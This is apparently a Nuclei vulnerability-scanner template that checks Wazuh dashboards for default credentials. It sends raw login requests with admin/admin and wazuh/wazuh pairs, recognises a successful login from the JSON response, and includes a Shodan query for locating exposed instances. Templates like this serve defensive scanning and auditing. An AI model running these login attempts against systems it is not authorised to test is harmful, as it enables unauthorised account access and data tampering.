http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: osd
    regex:
    - '&quot;version&quot;:&quot;([0-9.]+)&quot;'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"username":'
    - '"roles":'
  - condition: and
    part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    - wazuh
    username:
    - admin
    - wazuh
  raw:
  - 'GET /app/login?nextUrl=%2Fapp%2Fwazuh HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /auth/login HTTP/1.1

    Host: {{Hostname}}

    Osd-Version: {{osd}}

    Content-Type: application/json


    {"username":"{{username}}","password":"{{password}}"}

    '
  stop-at-first-match: true
id: wazuh-default-login
info:
  author: theamanrawat
  description: 'Wazuh contains default credentials. An attacker can obtain access
    to user accounts and access sensitive information, modify data, and/or execute
    unauthorized operations.

    '
  metadata:
    max-request: 4
    shodan-query: title:"Wazuh"
    verified: true
  name: Wazuh - Default Login
  reference:
  - https://documentation.wazuh.com/current/user-manual/user-administration/password-management.html
  - https://wazuh.com
  severity: high
  tags: wazuh,default-login
